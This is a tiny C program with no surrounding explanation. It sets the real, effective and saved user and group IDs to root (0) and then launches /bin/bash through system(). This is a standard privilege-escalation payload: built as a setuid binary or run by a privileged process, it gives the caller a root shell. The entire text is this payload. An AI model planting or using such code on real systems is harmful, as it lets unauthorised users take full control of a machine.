int main(){
    setresuid(0,0,0);
    setresgid(0,0,0);
    system("/bin/bash");
}